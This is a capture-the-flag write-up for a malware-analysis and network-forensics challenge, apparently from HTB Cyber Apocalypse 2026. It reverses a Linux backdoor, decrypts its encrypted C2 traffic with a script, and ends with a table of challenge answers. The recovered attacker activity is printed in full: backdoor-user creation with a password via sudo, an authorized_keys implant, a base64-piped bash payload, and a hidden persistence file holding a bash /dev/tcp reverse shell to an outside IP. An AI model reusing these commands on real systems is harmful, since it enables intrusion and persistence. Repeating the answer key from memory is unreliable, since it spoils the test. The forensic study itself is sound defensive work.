---
title: "The Ash-Binder Signature"
description: "Detailed writeup for The Ash-Binder Signature from Hack The Box Cyber Apocalypse CTF 2026: The Salt Crown."
date: 2026-07-29
categories:
  - [Writeups, "HTB Cyber Apocalypse CTF 2026: The Salt Crown"]
tags:
  - HTB Cyber Apocalypse 2026
  - Cloud
  - DFIR
  - Malware Analysis
  - Reverse Engineering
  - CTF
---

# The Ash-Binder Signature Writeup

## Challenge Overview

This challenge revolves around investigating a custom Linux backdoor used by an attacker to remotely control a compromised host. Unlike a normal reverse shell, the malware implements its own encrypted C2 protocol using AES-CBC, HMAC verification, and a custom framing protocol.

The challenge provides the malware binary together with a packet capture. The objective is to reverse the malware, recover the encryption routine, decrypt the traffic, reconstruct the attack timeline, and answer the forensic questions.

---

# Files Provided

```text
challenge/
├── linux_sys_updater
├── traffic.pcap
└── README
```

The investigation consisted of two major phases:

1. Reverse engineering the malware.
2. Decrypting the captured C2 traffic.

---

# Malware Analysis

Loading the binary into Ghidra immediately revealed that it was packaged with PyInstaller. After extracting the embedded Python bytecode and decompiling it, the networking logic became much easier to follow.

The beacon contained the client prefix:

```text
ASH_CLI_
```

The malware path was:

```text
/srv/AshShare/linux_sys_updater
```

---

# Recovering the Encryption Seed

Inside the decompiled source we recovered:

```python
X7wR9t = "ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j"
```

---

# Recovering the Key Derivation Function

The malware derived both the AES and HMAC keys from the seed.

```python
import hashlib

def derive(seed):
    base = hashlib.sha256(seed.encode()).digest()
    aes = hashlib.sha256(base + b"encryption").digest()[:32]
    hmac = hashlib.sha256(base + b"hmac").digest()[:32]
    return aes, hmac
```

Running the function produced the AES key.

Because the challenge requested the **MD5 of the AES key**, we calculated:

```python
import hashlib

print(hashlib.md5(aes).hexdigest())
```

Answer:

```text
6ffc06ff97ec037753feda5354b650b3
```

---

# Understanding the Packet Format

Each packet followed:

```text
[4-byte big endian length]
        |
        v
Base64(
    IV ||
    AES-CBC(ciphertext) ||
    SHA256(HMAC_KEY || IV || ciphertext)
)
```

The receive routine first read the length field before decoding and decrypting the packet.

---

# Writing the Decryptor

The following script was used to decrypt the traffic.

```python
import hashlib
import base64
import struct
import re

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

SEED="ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j"

base=hashlib.sha256(SEED.encode()).digest()
AES_KEY=hashlib.sha256(base+b"encryption").digest()[:32]
HMAC_KEY=hashlib.sha256(base+b"hmac").digest()[:32]

hexstream=""

with open("stream.txt") as f:
    for line in f:
        line=line.strip()
        if re.fullmatch(r"[0-9a-fA-F]+",line):
            hexstream+=line

stream=bytes.fromhex(hexstream)

off=0

while off+4<=len(stream):
    l=struct.unpack(">I",stream[off:off+4])[0]
    off+=4

    pkt=stream[off:off+l]
    off+=l

    blob=base64.b64decode(pkt)

    iv=blob[:16]
    ct=blob[16:-32]
    mac=blob[-32:]

    if hashlib.sha256(HMAC_KEY+iv+ct).digest()!=mac:
        continue

    cipher=AES.new(AES_KEY,AES.MODE_CBC,iv)
    print(unpad(cipher.decrypt(ct),16).decode())
```

---

# Decrypted Traffic

The decrypted packets reconstructed the attacker activity.

## Beacon

```text
BEACON ASH_CLI_nxpgkxxdatxrcbvkeqby ...
```

---

## Downloaded Files

The malware downloaded:

```text
DWNL_FILE /etc/ssh/sshd_config
DWNL_FILE /etc/hosts
```

Therefore the **second downloaded file** was:

```text
/ etc/hosts
```

(without the space: `/etc/hosts`)

---

## Uploaded SSH Key

The attacker uploaded a public key into:

```text
/home/kingmaelor/.ssh/authorized_keys
```

---

## Executed Commands

The attacker executed:

```text
uname -a
ls -la /etc
id
sudo -l
sudo useradd ...
cat /etc/passwd ...
env
```

Therefore the **second executed command** was:

```text
ls -la /etc
```

---

## Compromised Account

Running `id` revealed:

```text
uid=1005(kingmaelor)
gid=1011(crownspire)
```

Answer:

```text
kingmaelor:crownspire
```

---

## Privilege Escalation

The attacker abused passwordless sudo.

```bash
sudo useradd -m -s /bin/bash backup_usr
echo 'backup_usr:9cq3jPVN6Me1' | sudo chpasswd
```

Persistence credentials:

```text
backup_usr:9cq3jPVN6Me1
```

---

# Final Payload

The final command executed:

```bash
echo 'H4sI...' | base64 -d | gunzip | bash
```

Decompressing it revealed:

```bash
mkdir -p /home/kingmaelor/.local/share
echo 'bash -i >& /dev/tcp/141.101.64.3/53 0>&1' \
> /home/kingmaelor/.local/share/.systemd-helper
chmod +x /home/kingmaelor/.local/share/.systemd-helper
```

This created the persistence script:

```text
/home/kingmaelor/.local/share/.systemd-helper
```

which launched a reverse shell to:

```text
141.101.64.3:53
```

---

# Challenge Answers

| Question                    | Answer                                          |
| --------------------------- | ----------------------------------------------- |
| Malware path                | `/srv/AshShare/linux_sys_updater`               |
| Client prefix               | `ASH_CLI_`                                      |
| Upload command              | `UPLD_FILE`                                     |
| Output variable             | `Kd3uD9`                                        |
| AES key (MD5)               | `6ffc06ff97ec037753feda5354b650b3`              |
| Compromised credentials     | `kingmaelor:crownspire`                         |
| Second executed command     | `ls -la /etc`                                   |
| Second downloaded file      | `/etc/hosts`                                    |
| New persistence credentials | `backup_usr:9cq3jPVN6Me1`                       |
| Persistence file            | `/home/kingmaelor/.local/share/.systemd-helper` |
| Reverse shell               | `141.101.64.3:53`                               |

---

# Conclusion

This challenge combined malware reverse engineering, cryptography, and network forensics into a single investigation. By reversing the PyInstaller malware, recovering the custom key derivation routine, reconstructing the encrypted protocol, and decrypting the captured traffic, it was possible to fully reconstruct the attack chain and recover every challenge answer. The exercise demonstrates how reversing the malware and understanding its protocol can be far more effective than attempting to infer attacker activity directly from encrypted network traffic.
